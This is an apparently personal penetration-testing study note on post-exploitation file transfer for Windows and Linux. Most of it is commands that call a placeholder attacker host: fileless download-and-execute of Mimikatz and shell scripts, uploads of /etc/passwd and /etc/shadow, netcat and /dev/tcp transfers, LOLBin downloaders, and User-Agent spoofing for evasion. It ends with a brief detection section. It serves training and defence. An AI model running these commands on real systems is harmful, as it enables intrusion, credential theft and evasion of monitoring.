---
title: "File Transfer Techniques"
type: technique
tags: [exploitation, file-transfer, htb, linux, post-exploitation, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-file-transfer]
---

# File Transfer Techniques

## What it is

File transfer during a penetration test is the process of moving tools, payloads, and exfiltrated data between the attacker's machine and compromised hosts. The same techniques are used by defenders to understand and detect malicious lateral movement.

## How it works

The attacker leverages existing system utilities, network protocols (HTTP, SMB, FTP, DNS), or programming language built-ins to transfer files. The key principle is to blend in with legitimate traffic. Many approaches use protocols that are already allowed through firewalls (HTTP/S on 80/443).

## Prerequisites

- A foothold on the target (shell, RCE, or interactive access)
- Network connectivity to or from the attacker's host
- Knowledge of what interpreters and utilities exist on the target

---

## Methodology

1. Determine what is available on the target (PowerShell version, curl, wget, Python, etc.)
2. Choose a method that matches allowed outbound/inbound traffic
3. Verify file integrity after transfer (MD5/SHA1 comparison)
4. Clean up transferred tools after use

---

## Windows File Transfer Methods

### PowerShell Download (Preferred)

```powershell
# DownloadFile to disk
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8000/tool.exe','C:\Users\Public\tool.exe')

# Async download
(New-Object Net.WebClient).DownloadFileAsync('http://<ATTACKER_IP>:8000/tool.exe','C:\Users\Public\tool.exe')

# Fileless — execute in memory without touching disk
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/Invoke-Mimikatz.ps1')

# Pipeline variant
(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/script.ps1') | IEX

# Invoke-WebRequest (slower but built-in from PS 3.0)
Invoke-WebRequest http://<ATTACKER_IP>:8000/tool.exe -OutFile C:\Users\Public\tool.exe
iwr http://<ATTACKER_IP>:8000/tool.exe -OutFile tool.exe

# Fix SSL certificate errors
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Fix IE first-launch error
Invoke-WebRequest https://<ATTACKER_IP>/file.ps1 -UseBasicParsing | IEX
```

### PowerShell Upload

```powershell
# Upload via PSUpload.ps1 to Python uploadserver
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts

# Base64 POST upload
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\target\file.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64

# FTP upload
(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/file.txt', 'C:\file.txt')
```

### PowerShell Base64 Transfer

```powershell
# On attacker: encode a file
cat id_rsa | base64 -w 0; echo

# On Windows: decode base64 to file
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))

# Encode on Windows
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### SMB

```bash
# Attacker: start SMB server (no auth)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Attacker: start SMB server with credentials
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
# Windows: copy from SMB share
copy \\<ATTACKER_IP>\share\nc.exe

# Windows: mount with credentials
net use n: \\<ATTACKER_IP>\share /user:test test
copy n:\nc.exe
```

### SMB over WebDAV (when port 445 is blocked outbound)

```bash
# Attacker: install and start WebDAV server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```powershell
# Windows: connect and upload via WebDAV
dir \\<ATTACKER_IP>\DavWWWRoot
copy C:\Users\john\file.zip \\<ATTACKER_IP>\DavWWWRoot\
```

### FTP

```bash
# Attacker: start Python FTP server
sudo python3 -m pyftpdlib --port 21

# Attacker: start with credentials
sudo python3 -m pyftpdlib --port 21 --user test --password test
```

```powershell
# Windows FTP download (non-interactive)
(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/nc.exe', 'C:\Users\Public\nc.exe')
```

---

## Linux File Transfer Methods

### wget / cURL Download

```bash
# wget to disk
wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh

# curl to disk
curl -o /tmp/linpeas.sh http://<ATTACKER_IP>:8000/linpeas.sh

# Fileless wget — execute immediately
wget -qO- http://<ATTACKER_IP>:8000/script.sh | bash

# Fileless curl
curl http://<ATTACKER_IP>:8000/script.sh | bash
```

### cURL Upload

```bash
# Upload single file
curl -X POST http://<ATTACKER_IP>:8000/upload -F 'file=@/etc/passwd'

# Upload multiple files
curl -X POST http://<ATTACKER_IP>:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### SCP (SSH)

```bash
# Download from remote to local
scp user@<TARGET_IP>:/remote/path/file.txt /local/directory/

# Upload from local to remote
scp file.txt user@<TARGET_IP>:/remote/directory/

# Upload with SSH key
scp -i /opt/id_rsa linpeas.sh user@<TARGET_IP>:/dev/shm/

# Recursive upload/download
scp -r /local/directory/ user@<TARGET_IP>:/remote/directory/
scp -r user@<TARGET_IP>:/remote/directory/ /local/directory/
```

### Base64 Encode/Decode (no network required)

```bash
# Encode file on source
base64 -w 0 /etc/passwd; echo
cat id_rsa | base64 -w 0; echo

# Decode on destination (paste base64 string)
echo -n '<BASE64_STRING>' | base64 -d > /tmp/file

# Verify integrity
md5sum original_file
md5sum transferred_file
```

### Bash /dev/tcp (no curl/wget)

```bash
# Download via Bash built-in TCP
exec 3<>/dev/tcp/<ATTACKER_IP>/80
echo -e "GET /file.sh HTTP/1.1\nHost: <ATTACKER_IP>\n\n" >&3
cat <&3 > /tmp/file.sh
```

---

## Python HTTP Server (Attacker Side)

```bash
# Python 3 (use from attacker's working directory)
python3 -m http.server 8000

# Python 3 with upload capability
pip3 install uploadserver
python3 -m uploadserver 8000

# Python 2 fallback
python -m SimpleHTTPServer 8000
```

---

## Netcat File Transfer

```bash
# Receiver (target) listens
nc -l -p 8000 > received_file.exe

# Sender (attacker) sends
nc -q 0 <TARGET_IP> 8000 < SharpKatz.exe

# Alternative: attacker listens, target connects
# Attacker:
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Target:
nc <ATTACKER_IP> 443 > SharpKatz.exe

# Using /dev/tcp if nc is not available
cat < /dev/tcp/<ATTACKER_IP>/443 > received_file.exe
```

---

## LOLBins — Windows (LOLBAS)

Living off the Land Binaries that can perform file transfer. Full list: https://lolbas-project.github.io/

```powershell
# Certutil (wget for Windows — flagged by AMSI)
certutil.exe -verifyctl -split -f http://<ATTACKER_IP>:8000/nc.exe

# Bitsadmin
bitsadmin /transfer wcb /priority foreground http://<ATTACKER_IP>:8000/nc.exe C:\Users\Public\nc.exe

# BITS via PowerShell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<ATTACKER_IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

# CertReq upload to Netcat listener
certreq.exe -Post -config http://<ATTACKER_IP>:8000/ c:\windows\win.ini

# GfxDownloadWrapper (Intel GPU driver — may bypass AppWhitelisting)
GfxDownloadWrapper.exe "http://<ATTACKER_IP>/payload.exe" "C:\Temp\payload.exe"
```

## LOLBins — Linux (GTFOBins)

```bash
# OpenSSL (encrypted transfer)
# Attacker — create cert and serve file
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/linpeas.sh

# Target — download via OpenSSL
openssl s_client -connect <ATTACKER_IP>:80 -quiet > linpeas.sh
```

---

## Evading Detection

```powershell
# Spoof User-Agent to blend with legitimate browser traffic
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ATTACKER_IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Key evasion principles:
- Use HTTPS (port 443) to encrypt transfers
- Use legitimate protocol ports (80, 443)
- Spoof User-Agent strings
- Use LOLBAS/GTFOBins to avoid dropping new binaries
- Base64 encode transfers through text-only channels (web shells, command injection)
- Fileless execution avoids writing to disk entirely

---

## Detection and Defence

- Monitor `certutil.exe`, `bitsadmin.exe`, `CertReq.exe` for unusual network activity
- Baseline and alert on PowerShell `DownloadFile`, `IEX`, `Invoke-WebRequest` in logs
- Inspect HTTPS traffic (TLS inspection / SSL inspection) in corporate environments
- Monitor for unusual processes making network connections (web server spawning curl)
- Hash-verify scripts before execution in automated pipelines

## Tools

- Impacket — SMB server (`impacket-smbserver`)
- Python — HTTP and upload servers
- Netcat — raw TCP file transfer
- OpenSSL — encrypted transfer via GTFOBins
- Certutil — Windows LOLBin downloader
- Bitsadmin — Windows BITS transfer
- WinSCP / SCP — SSH-based transfer

## Sources

- CPTS File Transfer module (Windows, Linux, Miscellaneous, LOLBins, Detection, Evading Detection)
